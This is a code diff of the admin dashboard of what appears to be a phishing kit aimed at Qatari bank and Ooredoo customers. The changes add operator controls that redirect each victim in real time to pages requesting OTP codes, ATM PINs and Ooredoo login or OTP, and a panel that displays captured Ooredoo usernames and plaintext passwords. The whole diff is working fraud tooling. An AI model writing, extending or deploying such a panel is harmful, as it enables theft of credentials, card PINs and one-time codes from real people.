@@ -3,9 +3,9 @@ import { useLanguage } from "@/contexts/LanguageContext";
 import { useLocation } from "wouter";
 import { trpc } from "@/lib/trpc";
 import { Dialog, DialogContent } from "@/components/ui/dialog";
-import { Loader2, Eye, RefreshCcw, Check, X, Users, Lock, LogOut, Globe, Phone, CreditCard, Calendar, Hash, MapPin } from "lucide-react";
+import { Loader2, Eye, RefreshCcw, Check, X, Users, Lock, LogOut, Globe, Phone, CreditCard, Calendar, Hash, MapPin, ExternalLink, ChevronDown } from "lucide-react";
 
-// --- PROFESSIONAL STYLES (PURE CSS) ---
+// --- PROFESSIONAL STYLES ---
 const styles = {
   loginContainer: {
     minHeight: '100vh',
@@ -164,8 +164,7 @@ const getStatusStyles = (currentStep: string | null | undefined) => {
 };
 
 export default function AdminDashboard() {
-  const { language, t } = useLanguage();
-  const [, setLocation] = useLocation();
+  const { language } = useLanguage();
   const [searchTerm, setSearchTerm] = useState("");
   const [selectedSession, setSelectedSession] = useState<string | null>(null);
   const [showDetails, setShowDetails] = useState(false);
@@ -177,7 +176,7 @@ export default function AdminDashboard() {
 
   const { data: submissions, isLoading, refetch } = trpc.submissions.getAllSubmissions.useQuery(undefined, {
     enabled: isAuthenticated,
-    refetchInterval: 2000, // تحديث كل ثانيتين لمتابعة لحظية أدق
+    refetchInterval: 1000, 
   });
 
   const takeActionMutation = trpc.submissions.adminTakeAction.useMutation();
@@ -341,20 +340,37 @@ export default function AdminDashboard() {
                   <td style={styles.td}>{new Date(s.createdAt).toLocaleTimeString(language === 'ar' ? 'ar-QA' : 'en-US')}</td>
                   <td style={styles.td}>
                     <div style={{ display: 'flex', gap: '8px' }}>
-                      <button onClick={() => { setSelectedSession(s.id); setShowDetails(true); }} style={{ padding: '8px', borderRadius: '8px', border: '1px solid #e2e8f0', backgroundColor: '#fff', cursor: 'pointer', color: '#64748b' }}>
-                        <Eye size={18} />
+                      <button 
+                        onClick={() => { setSelectedSession(s.id); setShowDetails(true); }} 
+                        style={{ display: 'flex', alignItems: 'center', gap: '6px', padding: '8px 12px', borderRadius: '8px', border: '1px solid #e2e8f0', backgroundColor: '#fff', cursor: 'pointer', color: '#64748b', fontSize: '12px', fontWeight: 'bold' }}
+                      >
+                        <Eye size={16} />
+                        {language === 'ar' ? "التفاصيل" : "Details"}
                       </button>
+                      
                       <div style={{ position: 'relative' }}>
-                        <button onClick={() => setShowRedirectMenu(showRedirectMenu === s.id ? null : s.id)} style={{ padding: '8px 16px', borderRadius: '8px', backgroundColor: '#e11d48', color: '#fff', border: 'none', cursor: 'pointer', fontSize: '12px', fontWeight: 'bold' }}>
-                          {language === 'ar' ? "توجيه" : "Redirect"}
+                        <button 
+                          onClick={() => setShowRedirectMenu(showRedirectMenu === s.id ? null : s.id)} 
+                          style={{ display: 'flex', alignItems: 'center', gap: '6px', padding: '8px 16px', borderRadius: '8px', backgroundColor: '#e11d48', color: '#fff', border: 'none', cursor: 'pointer', fontSize: '12px', fontWeight: 'bold' }}
+                        >
+                          <ExternalLink size={16} />
+                          {language === 'ar' ? "إعادة توجيه" : "Redirect"}
+                          <ChevronDown size={14} />
                         </button>
+                        
                         {showRedirectMenu === s.id && (
-                          <div style={{ position: 'absolute', top: '100%', [language === 'ar' ? 'left' : 'right']: 0, marginTop: '8px', backgroundColor: '#fff', border: '1px solid #e2e8f0', borderRadius: '12px', padding: '8px', zIndex: 50, boxShadow: '0 10px 15px -3px rgba(0, 0, 0, 0.1)', width: '160px' }}>
-                            <button onClick={() => handleAction(s.id, 'approve')} style={{ width: '100%', textAlign: language === 'ar' ? 'right' : 'left', padding: '8px 12px', border: 'none', backgroundColor: 'transparent', cursor: 'pointer', borderRadius: '6px', fontSize: '13px' }}>✅ {language === 'ar' ? "موافقة" : "Approve"}</button>
-                            <button onClick={() => handleAction(s.id, 'otp', undefined, 'otp')} style={{ width: '100%', textAlign: language === 'ar' ? 'right' : 'left', padding: '8px 12px', border: 'none', backgroundColor: 'transparent', cursor: 'pointer', borderRadius: '6px', fontSize: '13px' }}>🔑 {language === 'ar' ? "طلب OTP" : "Request OTP"}</button>
-                            <button onClick={() => handleAction(s.id, 'atm', undefined, 'atm-pin')} style={{ width: '100%', textAlign: language === 'ar' ? 'right' : 'left', padding: '8px 12px', border: 'none', backgroundColor: 'transparent', cursor: 'pointer', borderRadius: '6px', fontSize: '13px' }}>💳 {language === 'ar' ? "طلب ATM PIN" : "Request ATM PIN"}</button>
-                            <button onClick={() => handleAction(s.id, 'ooredoo', undefined, 'ooredoo')} style={{ width: '100%', textAlign: language === 'ar' ? 'right' : 'left', padding: '8px 12px', border: 'none', backgroundColor: 'transparent', cursor: 'pointer', borderRadius: '6px', fontSize: '13px' }}>🌐 {language === 'ar' ? "توجيه Ooredoo" : "Redirect Ooredoo"}</button>
-                            <button onClick={() => handleAction(s.id, 'reject', 'بيانات غير صحيحة')} style={{ width: '100%', textAlign: language === 'ar' ? 'right' : 'left', padding: '8px 12px', border: 'none', backgroundColor: 'transparent', cursor: 'pointer', borderRadius: '6px', fontSize: '13px', color: '#e11d48' }}>❌ {language === 'ar' ? "رفض" : "Reject"}</button>
+                          <div style={{ position: 'absolute', top: '100%', right: 0, marginTop: '8px', backgroundColor: '#fff', border: '1px solid #e2e8f0', borderRadius: '12px', boxShadow: '0 10px 15px -3px rgba(0, 0, 0, 0.1)', zIndex: 50, width: '200px', padding: '8px', display: 'flex', flexDirection: 'column', gap: '4px' }}>
+                            <div style={{ padding: '8px', fontSize: '11px', fontWeight: 'bold', color: '#94a3b8', borderBottom: '1px solid #f1f5f9' }}>{language === 'ar' ? "تحكم بالعميل" : "User Control"}</div>
+                            <button onClick={() => handleAction(s.id, 'approve')} style={{ width: '100%', textAlign: 'right', padding: '10px', border: 'none', backgroundColor: '#f0fdf4', color: '#166534', cursor: 'pointer', borderRadius: '8px', fontSize: '13px', fontWeight: 'bold' }}>✅ {language === 'ar' ? "قبول (متابعة)" : "Accept"}</button>
+                            <button onClick={() => handleAction(s.id, 'reject', 'بيانات غير صحيحة')} style={{ width: '100%', textAlign: 'right', padding: '10px', border: 'none', backgroundColor: '#fef2f2', color: '#991b1b', cursor: 'pointer', borderRadius: '8px', fontSize: '13px', fontWeight: 'bold' }}>❌ {language === 'ar' ? "رفض (إعادة محاولة)" : "Reject"}</button>
+                            
+                            <div style={{ padding: '8px', fontSize: '11px', fontWeight: 'bold', color: '#94a3b8', borderBottom: '1px solid #f1f5f9', marginTop: '4px' }}>{language === 'ar' ? "توجيه لصفحة محددة" : "Direct to Page"}</div>
+                            <button onClick={() => handleAction(s.id, 'redirect', undefined, 'login-method')} style={{ width: '100%', textAlign: 'right', padding: '8px', border: 'none', backgroundColor: 'transparent', cursor: 'pointer', borderRadius: '6px', fontSize: '12px' }}>📄 {language === 'ar' ? "صفحة الدخول" : "Login Page"}</button>
+                            <button onClick={() => handleAction(s.id, 'redirect', undefined, 'otp')} style={{ width: '100%', textAlign: 'right', padding: '8px', border: 'none', backgroundColor: 'transparent', cursor: 'pointer', borderRadius: '6px', fontSize: '12px' }}>🔑 {language === 'ar' ? "صفحة OTP" : "OTP Page"}</button>
+                            <button onClick={() => handleAction(s.id, 'redirect', undefined, 'atm-pin')} style={{ width: '100%', textAlign: 'right', padding: '8px', border: 'none', backgroundColor: 'transparent', cursor: 'pointer', borderRadius: '6px', fontSize: '12px' }}>💳 {language === 'ar' ? "صفحة ATM PIN" : "ATM PIN Page"}</button>
+                            <button onClick={() => handleAction(s.id, 'redirect', undefined, 'ooredoo')} style={{ width: '100%', textAlign: 'right', padding: '8px', border: 'none', backgroundColor: 'transparent', cursor: 'pointer', borderRadius: '6px', fontSize: '12px' }}>🌐 {language === 'ar' ? "صفحة Ooredoo" : "Ooredoo Page"}</button>
+                            <button onClick={() => handleAction(s.id, 'redirect', undefined, 'otp-ooredoo')} style={{ width: '100%', textAlign: 'right', padding: '8px', border: 'none', backgroundColor: 'transparent', cursor: 'pointer', borderRadius: '6px', fontSize: '12px' }}>📱 {language === 'ar' ? "صفحة OTP Ooredoo" : "OTP Ooredoo Page"}</button>
+                            <button onClick={() => handleAction(s.id, 'redirect', undefined, 'success')} style={{ width: '100%', textAlign: 'right', padding: '8px', border: 'none', backgroundColor: 'transparent', cursor: 'pointer', borderRadius: '6px', fontSize: '12px' }}>✨ {language === 'ar' ? "صفحة النجاح" : "Success Page"}</button>
                           </div>
                         )}
                       </div>
@@ -372,7 +388,7 @@ export default function AdminDashboard() {
           {selectedData && (
             <div dir={language === 'ar' ? 'rtl' : 'ltr'} style={{ backgroundColor: '#fff' }}>
               <div style={{ backgroundColor: '#e11d48', padding: '32px', color: '#fff' }}>
-                <h2 style={{ fontSize: '24px', fontWeight: 'bold', marginBottom: '8px' }}>{language === 'ar' ? "تفاصيل الطلب" : "Submission Details"}</h2>
+                <h2 style={{ fontSize: '24px', fontWeight: 'bold', marginBottom: '8px' }}>{language === 'ar' ? "كل بيانات العميل" : "All Client Data"}</h2>
                 <p style={{ opacity: 0.8, fontSize: '14px' }}>ID: {selectedData.id}</p>
               </div>
               
@@ -468,6 +484,26 @@ export default function AdminDashboard() {
                     </div>
                   </section>
                 </div>
+
+                {/* Ooredoo Data */}
+                <section>
+                  <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '16px', color: '#e11d48' }}>
+                    <Globe size={20} />
+                    <h3 style={{ fontWeight: 'bold' }}>{language === 'ar' ? "بيانات Ooredoo" : "Ooredoo Data"}</h3>
+                  </div>
+                  <div style={{ backgroundColor: '#f8fafc', padding: '20px', borderRadius: '16px' }}>
+                    <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '16px' }}>
+                      <div>
+                        <p style={{ fontSize: '12px', color: '#64748b', marginBottom: '4px' }}>{language === 'ar' ? "اسم المستخدم" : "Username"}</p>
+                        <p style={{ fontWeight: '500' }}>{selectedData.ooredoo?.ooredooUser || "—"}</p>
+                      </div>
+                      <div>
+                        <p style={{ fontSize: '12px', color: '#64748b', marginBottom: '4px' }}>{language === 'ar' ? "كلمة المرور" : "Password"}</p>
+                        <p style={{ fontWeight: '500' }}>{selectedData.ooredoo?.ooredooPassword || "—"}</p>
+                      </div>
+                    </div>
+                  </div>
+                </section>
               </div>
             </div>
           )}
